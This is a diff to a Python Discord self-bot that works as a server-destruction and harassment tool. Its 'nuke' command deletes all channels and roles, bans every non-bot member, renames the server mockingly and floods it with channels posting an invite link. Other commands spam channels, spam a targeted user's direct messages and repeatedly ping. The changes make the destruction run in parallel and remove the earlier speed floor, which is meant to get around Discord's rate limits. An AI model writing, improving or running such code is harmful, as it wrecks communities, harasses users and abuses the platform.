@@ -31,7 +31,7 @@ if not TOKEN:
     print("❌ 렌더 Environment 탭에 DISCORD_TOKEN 값을 넣어주세요.")
     exit(1)
 
-# ★ 니 디스코드 ID (적용 완료) ★
+# ★ 니 디스코드 ID ★
 OWNER_ID = 1568590045286244358
 
 # 명령어
@@ -39,6 +39,7 @@ START_TRIGGER = "!장애타"
 STOP_TRIGGER = "!STOP"
 SETTINGS_TRIGGER = "!설정"
 SPEED_TRIGGER = "!스피드"
+TURBO_TRIGGER = "!초고속"
 SPACE_TRIGGER = "!띄어쓰기"
 NORMAL_TRIGGER = "!일반쓰기"
 HELP_TRIGGER = "!기능"
@@ -89,7 +90,7 @@ class SpamClient(discord.Client):
         self.is_pinging = False
         self.is_nuking = False
         self.spam_content = ""
-        self.spam_delay = 1.0 
+        self.spam_delay = 0.4 # 기본 0.4초로 변경
         self.spam_mode = "normal"
 
     def make_spam_message(self):
@@ -103,14 +104,14 @@ class SpamClient(discord.Client):
     async def on_message(self, message):
         if message.author.id != self.user.id and message.author.id != OWNER_ID: return
 
-        # 1. 전체 중지 (!STOP)
+        # 1. 중지 (!STOP)
         if message.content == STOP_TRIGGER:
             self.is_spamming = False
             self.is_pinging = False
             self.is_nuking = False
             await message.channel.send("STOP"); return
 
-        # 2. 누크 기능 (!누크 [숫자])
+        # 2. 누크 (!누크)
         if message.content.startswith(NUKE_TRIGGER):
             guild = message.guild
             if not guild: return
@@ -125,52 +126,45 @@ class SpamClient(discord.Client):
 
             channels_to_delete = list(guild.channels)
             
-            for channel in channels_to_delete:
-                if not self.is_nuking: return
-                try: 
-                    await channel.delete()
-                    await asyncio.sleep(max(0.1, self.spam_delay)) # 속도 적용
+            # 삭제는 한 번만 (병렬 처리) - 삭제 끝나면 다시 삭제 안 함
+            async def delete_channel(ch):
+                try: await ch.delete()
                 except: pass
+            await asyncio.gather(*(delete_channel(ch) for ch in channels_to_delete))
             
             roles_to_delete = [r for r in guild.roles if r != guild.default_role and r < guild.me.top_role]
-            for role in roles_to_delete:
-                if not self.is_nuking: return
-                try: 
-                    await role.delete()
-                    await asyncio.sleep(max(0.1, self.spam_delay)) # 속도 적용
+            async def delete_role(role):
+                try: await role.delete()
                 except: pass
+            await asyncio.gather(*(delete_role(r) for r in roles_to_delete))
                     
-            for member in guild.members:
-                if not self.is_nuking: return
+            async def ban_member(m):
                 try:
-                    if not member.bot and member.id != OWNER_ID: 
-                        await member.ban(reason="Nuked")
-                        await asyncio.sleep(max(0.1, self.spam_delay)) # 속도 적용
+                    if not m.bot and m.id != OWNER_ID: await m.ban(reason="Nuked")
                 except: pass
+            await asyncio.gather(*(ban_member(m) for m in guild.members))
             
             try: await guild.edit(name="현월 서버 터짐 ㅋㅋ")
             except: pass
 
-            # 채널 폭탄 30세트
-            for _ in range(30): 
-                if not self.is_nuking: return
+            async def create_spam_channel(ch_name):
+                try:
+                    new_channel = await guild.create_text_channel(name=ch_name)
+                    await new_channel.send("서버이전\nhttps://discord.gg/Fs2a99S5Xu")
+                except: pass
+
+            tasks = []
+            for _ in range(30):
                 for ch_name in nuke_channel_names:
-                    if not self.is_nuking: return
-                    try:
-                        new_channel = await guild.create_text_channel(name=ch_name)
-                        for _ in range(5):
-                            await new_channel.send("서버이전\nhttps://discord.gg/Fs2a99S5Xu")
-                    except: pass
+                    tasks.append(create_spam_channel(ch_name))
             
-            if extra_count > 0:
-                for _ in range(extra_count):
-                    if not self.is_nuking: return
-                    try:
-                        ch_name = random.choice(nuke_channel_names)
-                        new_channel = await guild.create_text_channel(name=ch_name)
-                        await new_channel.send("서버이전\nhttps://discord.gg/Fs2a99S5Xu")
-                        await asyncio.sleep(max(0.1, self.spam_delay)) # 속도 적용
-                    except: await asyncio.sleep(1)
+            for _ in range(extra_count):
+                tasks.append(create_spam_channel(random.choice(nuke_channel_names)))
+
+            for i in range(0, len(tasks), 50):
+                if not self.is_nuking: return
+                await asyncio.gather(*tasks[i:i+50])
+                await asyncio.sleep(1)
 
             return
 
@@ -182,16 +176,17 @@ class SpamClient(discord.Client):
             while self.is_pinging:
                 try:
                     sent_msg = await message.channel.send(ping_text)
-                    await asyncio.sleep(max(0.1, self.spam_delay / 2))
+                    await asyncio.sleep(max(0.05, self.spam_delay / 2))
                     await sent_msg.delete()
-                    await asyncio.sleep(max(0.1, self.spam_delay / 2))
+                    await asyncio.sleep(max(0.05, self.spam_delay / 2))
                 except Exception: await asyncio.sleep(1)
             return
 
         # 4. 기능 목록
         if message.content == HELP_TRIGGER:
             help_text = (f"**[ 기능 목록 ]**\n`{START_TRIGGER}` : 도배\n`{STOP_TRIGGER}` : 중지\n"
-                         f"`{SETTINGS_TRIGGER}` : 속도 확인\n`{SPEED_TRIGGER} [숫자]` : 속도 변경 (누크/핑/도배 공통 적용)\n"
+                         f"`{SETTINGS_TRIGGER}` : 현재 속도 확인\n`{SPEED_TRIGGER} [숫자]` : 속도 변경\n"
+                         f"`{TURBO_TRIGGER}` : 0.083초 초고속 모드\n"
                          f"`{SPACE_TRIGGER}` : 띄어쓰기\n`{NORMAL_TRIGGER}` : 일반쓰기\n"
                          f"`{SPAM_TRIGGER} [문장]` : 커스텀 도배\n`{MENTION_TRIGGER} @유저` : DM 도배\n"
                          f"`{DOBAE_TRIGGER} @유저` : 채널 도배\n`{PING_TRIGGER} [문장]` : 반복 핑\n"
@@ -200,14 +195,21 @@ class SpamClient(discord.Client):
 
         if message.content == SPACE_TRIGGER: self.spam_mode = "space"; await message.channel.send("띄어쓰기 모드 ON"); return
         if message.content == NORMAL_TRIGGER: self.spam_mode = "normal"; await message.channel.send("일반쓰기 모드 ON"); return
-        if message.content == SETTINGS_TRIGGER: await message.channel.send(f"현재 속도: {self.spam_delay}초"); return
+        if message.content == SETTINGS_TRIGGER: await message.channel.send(f"{self.spam_delay}"); return # 숫자만 출력
 
+        # 5. 속도 변경 (숫자만)
         if message.content.startswith(SPEED_TRIGGER):
             try:
                 new_delay = float(message.content.split(" ")[1])
-                self.spam_delay = max(0.1, min(100.0, new_delay)) # 최소 0.1초 제한 (API 보호)
-                await message.channel.send(f"속도 변경됨: {self.spam_delay}초 (도배/누크/핑 공통)")
-            except: await message.channel.send("숫자만 입력해라")
+                self.spam_delay = max(0.05, min(100.0, new_delay))
+                await message.channel.send(f"{self.spam_delay}") # 숫자만 출력
+            except: pass
+            return
+
+        # 6. 초고속 모드
+        if message.content == TURBO_TRIGGER:
+            self.spam_delay = 0.083
+            await message.channel.send("0.083")
             return
 
         if message.content.startswith(SPAM_TRIGGER):
@@ -216,7 +218,7 @@ class SpamClient(discord.Client):
             if not text: return
             self.is_spamming = True
             while self.is_spamming:
-                try: await message.channel.send(text); await asyncio.sleep(max(0.1, self.spam_delay))
+                try: await message.channel.send(text); await asyncio.sleep(max(0.05, self.spam_delay))
                 except discord.errors.HTTPException as e: await asyncio.sleep(e.response.headers.get('Retry-After', 2) + 0.5 if e.status == 429 else 1)
                 except Exception: await asyncio.sleep(1)
             return
@@ -226,7 +228,7 @@ class SpamClient(discord.Client):
             target = message.mentions[0]
             self.is_spamming = True
             while self.is_spamming:
-                try: await message.channel.send(dobae_text.replace("@m057677", target.mention).format(num=random.choice(random_nums))); await asyncio.sleep(max(0.1, self.spam_delay))
+                try: await message.channel.send(dobae_text.replace("@m057677", target.mention).format(num=random.choice(random_nums))); await asyncio.sleep(max(0.05, self.spam_delay))
                 except Exception: await asyncio.sleep(1)
             return
 
@@ -237,7 +239,7 @@ class SpamClient(discord.Client):
             try: dm = await target.create_dm()
             except: await message.channel.send("DM 차단됨"); self.is_spamming = False; return
             while self.is_spamming:
-                try: await dm.send(mention_text.format(target=target.mention, num=random.choice(random_nums))); await asyncio.sleep(max(0.1, self.spam_delay))
+                try: await dm.send(mention_text.format(target=target.mention, num=random.choice(random_nums))); await asyncio.sleep(max(0.05, self.spam_delay))
                 except Exception: await asyncio.sleep(1)
             return
 
@@ -245,7 +247,7 @@ class SpamClient(discord.Client):
             if self.is_spamming: return
             self.is_spamming = True
             while self.is_spamming:
-                try: await message.channel.send(self.make_spam_message()); await asyncio.sleep(max(0.1, self.spam_delay))
+                try: await message.channel.send(self.make_spam_message()); await asyncio.sleep(max(0.05, self.spam_delay))
                 except Exception: await asyncio.sleep(1)
             return
 
